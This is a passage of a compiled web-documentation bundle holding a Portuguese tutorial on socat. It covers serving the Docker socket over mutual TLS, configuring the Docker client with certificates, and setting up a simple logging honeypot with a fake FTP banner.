tudo."]}),"\n"]}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsxs)(a.p,{children:["O cliente tamb\xe9m precisar\xe1 de uma c\xf3pia do ",(0,o.jsx)(a.code,{children:"ca.pem"})," para verificar a\nautenticidade do servidor."]})}),"\n",(0,o.jsx)(a.h4,{id:"7-executar-o-socat-com-tls",children:"7. Executar o socat com TLS"}),"\n",(0,o.jsxs)(a.p,{children:["Agora que voc\xea tem os certificados do lado ",(0,o.jsx)(a.strong,{children:"servidor"}),", pode executar o socat:"]}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"socat \\\nOPENSSL-LISTEN:2376,fork,reuseaddr,\\\ncert=server-cert.pem,key=server-key.pem,cafile=ca.pem,verify=1 \\\nunix-connect:/var/run/docker.sock\n"})}),"\n",(0,o.jsxs)(a.admonition,{type:"info",children:[(0,o.jsxs)(a.ul,{children:["\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.strong,{children:"OPENSSL-LISTEN:2376"}),": socat vai escutar na porta 2376 (padr\xe3o de TLS para\nDocker remoto)."]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.strong,{children:"fork"}),": permite que socat aceite m\xfaltiplas conex\xf5es simult\xe2neas, criando\nprocessos filhos."]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.strong,{children:"reuseaddr"}),": permite reuso imediato da porta em caso de restart."]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.strong,{children:"cert=server-cert.pem"}),": caminho do certificado do servidor."]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.strong,{children:"key=server-key.pem"}),": caminho da chave privada do servidor."]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.strong,{children:"cafile=ca.pem"}),": arquivo da CA para verificar o certificado de quem conecta."]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.strong,{children:"verify=1"}),": exige que os clientes apresentem certificado v\xe1lido (mTLS)."]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.strong,{children:"unix-connect:/var/run/docker.sock"}),": conecta localmente ao socket do Docker."]}),"\n"]}),(0,o.jsxs)(a.p,{children:[(0,o.jsx)(a.strong,{children:"Dica"}),": Se o Docker estiver rodando em ",(0,o.jsx)(a.code,{children:"/var/run/docker.sock"}),", verifique as\npermiss\xf5es do arquivo e se voc\xea tem permiss\xf5es adequadas para acess\xe1-lo."]})]}),"\n",(0,o.jsx)(a.h4,{id:"8-configurar-o-docker-cli-cliente-para-usar-tls",children:"8. Configurar o Docker CLI (Cliente) para usar TLS"}),"\n",(0,o.jsx)(a.p,{children:"No lado do cliente, precisamos:"}),"\n",(0,o.jsx)(a.p,{children:"Copiar (ou ter dispon\xedvel):"}),"\n",(0,o.jsxs)(a.ul,{children:["\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.code,{children:"ca.pem"})," (CA)"]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.code,{children:"cert.pem"})," (certificado do cliente)"]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.code,{children:"key.pem"})," (chave privada do cliente)"]}),"\n"]}),"\n",(0,o.jsx)(a.p,{children:"Definir vari\xe1veis de ambiente para o Docker CLI:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"export DOCKER_HOST=tcp://<IP_DO_SERVIDOR>:2376\nexport DOCKER_TLS_VERIFY=1\nexport DOCKER_CERT_PATH=/caminho/para/o/diretorio/dos/certs\n"})}),"\n",(0,o.jsx)(a.admonition,{type:"info",children:(0,o.jsxs)(a.ul,{children:["\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.code,{children:"<IP_DO_SERVIDOR>"})," \xe9 o IP ou hostname onde o socat est\xe1 escutando (pode ser\n",(0,o.jsx)(a.code,{children:"127.0.0.1"})," se for local)."]}),"\n",(0,o.jsxs)(a.li,{children:[(0,o.jsx)(a.code,{children:"DOCKER_CERT_PATH"})," deve apontar para o diret\xf3rio que cont\xe9m ",(0,o.jsx)(a.code,{children:"ca.pem"}),",\n",(0,o.jsx)(a.code,{children:"cert.pem"})," e ",(0,o.jsx)(a.code,{children:"key.pem"}),"."]}),"\n"]})}),"\n",(0,o.jsx)(a.p,{children:"Testar a conex\xe3o:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"docker info\n"})}),"\n",(0,o.jsx)(a.p,{children:"ou"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"docker ps\n"})}),"\n",(0,o.jsx)(a.p,{children:"Outra op\xe7\xe3o sem a necessidade de exportar as vari\xe1veis de ambiente:"}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"docker --tlsverify \\\n  --tlscacert=ca.pem \\\n  --tlscert=cert.pem \\\n  --tlskey=key.pem \\\n  -H=tcp://localhost:2376 \\\n  ps\n"})}),"\n",(0,o.jsx)(a.p,{children:"Caso esteja tudo configurado corretamente, o Docker CLI vai se conectar ao socat\nvia TLS, o socat vai se conectar ao socket Unix local do Docker, e voc\xea dever\xe1\nver as informa\xe7\xf5es dos cont\xeaineres ou do daemon Docker."}),"\n",(0,o.jsx)(a.h4,{id:"9-considera\xe7\xf5es-de-seguran\xe7a",children:"9. Considera\xe7\xf5es de Seguran\xe7a"}),"\n",(0,o.jsxs)(a.ul,{children:["\n",(0,o.jsxs)(a.li,{children:["Sempre proteja as chaves privadas (",(0,o.jsx)(a.code,{children:"ca-key.pem"}),", ",(0,o.jsx)(a.code,{children:"server-key.pem"})," e ",(0,o.jsx)(a.code,{children:"key.pem"}),")\ncom permiss\xf5es de arquivo corretas."]}),"\n",(0,o.jsxs)(a.li,{children:['Idealmente, utilize Subject Alternative Names (SAN) para evitar warning de\n"Common Name mismatch", especialmente se n\xe3o for usar ',(0,o.jsx)(a.code,{children:"localhost"}),"."]}),"\n",(0,o.jsx)(a.li,{children:"Em produ\xe7\xe3o, ou em ambiente de rede mais ampla, considere usar certificados de\numa CA confi\xe1vel ou um servi\xe7o interno de PKI, ao inv\xe9s de autoassinados."}),"\n"]}),"\n",(0,o.jsx)(a.h4,{id:"10-resumo",children:"10. Resumo"}),"\n",(0,o.jsxs)(a.ol,{children:["\n",(0,o.jsx)(a.li,{children:"Gere a CA (chave e certificado raiz)."}),"\n",(0,o.jsx)(a.li,{children:"Gere o certificado e a chave do servidor (assine com a CA)."}),"\n",(0,o.jsx)(a.li,{children:"Gere o certificado e a chave do cliente (assine com a CA)."}),"\n",(0,o.jsxs)(a.li,{children:["Inicie o ",(0,o.jsx)(a.code,{children:"socat"})," com ",(0,o.jsx)(a.code,{children:"OPENSSL-LISTEN"})," na porta desejada, apontando para os\ncertificados do servidor e exigindo (",(0,o.jsx)(a.code,{children:"verify=1"}),") um certificado v\xe1lido do\ncliente."]}),"\n",(0,o.jsx)(a.li,{children:"Configure o cliente Docker com vari\xe1veis de ambiente apontando para a porta e\nhabilitando TLS, al\xe9m de fornecer os certificados para autentica\xe7\xe3o m\xfatua."}),"\n"]}),"\n",(0,o.jsx)(a.p,{children:"Assim, voc\xea ter\xe1 um t\xfanel TLS entre o Docker CLI (cliente) e o Docker Daemon\n(servidor, via socket Unix), garantindo confidencialidade e autenticidade de\nambas as partes."}),"\n",(0,o.jsx)(a.h2,{id:"honeypot-simples",children:"Honeypot Simples"}),"\n",(0,o.jsxs)(a.p,{children:["O socat pode ser usado de forma rudimentar para montar um ",(0,o.jsx)(a.em,{children:"honeypot"}),", embora\nexistam solu\xe7\xf5es mais completas voltadas a isso.\nUm exemplo seria apenas enviar um banner falso e registrar as entradas:"]}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"cat << EOF > fake_ftp_banner.txt\n220 ProFTPD 1.3.4a Server (Ubuntu)\nEOF\n"})}),"\n",(0,o.jsx)(a.pre,{children:(0,o.jsx)(a.code,{className:"language-bash",children:"while true; do\n  socat TCP-LISTEN:21,fork SYSTEM:'cat fake_ftp_banner.txt' |& tee -a ftp.log\n  echo \"$(date)\" >> ftp.log\ndone\n"})}),"\n",(0,o.jsxs)(a.p,{children:["Esse script simples escutar\xe1 na porta 21 e, ao receber uma conex\xe3o, enviar\xe1 o\nconte\xfado do fake_ftp_banner.txt. O ",(0,o.jsx)(a.code,{children:"tee"})," registrar\xe1 tudo no arquivo ftp.log."]}),"\n",(0,o.jsx)(a.h2,{id:"conclus\xe3o",children:"Conclus\xe3o"}),"\n",(0,o.jsxs)(a.p,{children:["O ",(0,o.jsx)(a.code,{children:"socat"})," \xe9 uma ferramenta poderosa, que vai al\xe9m do nc em muitos aspectos,\nprincipalmente devido ao suporte avan\xe7ado a SSL/TLS, suporte a portas seriais,\nfork, e diversas outras op\xe7\xf5es de endere\xe7amento. Para quem precisa de conex\xf5es\nmais vers\xe1teis e seguras, o socat \xe9 um excelente aliado, seja para simples\ntestes de portas ou para a constru\xe7\xe3o de t\xfaneis criptografados em ambientes de\nprodu\xe7\xe3o."]})]})}function p(e={}){const{wrapper:a}={...(0,r.R)(),...e.components};return a?(0,o.jsx)(a,{...e,children:(0,o.jsx)(t,{...e})}):t(e)}},8453:(e,a,s)=>{s.d(a,{R:()=>c,x:()=>i});var n=s(6540);const o={},r=n.createContext(o);function c(e){const a=n.useContext(r);return n.useMemo((function(){return"function"==typeof e?e(a):{...a,...e}}),[a,e])}function i(e){let a;return a=e.disableParentContext?"function"==typeof e.components?e.components(o):e.components||o:c(e.components),n.createElement(r.Provider,{value:a},e.children)}}}]);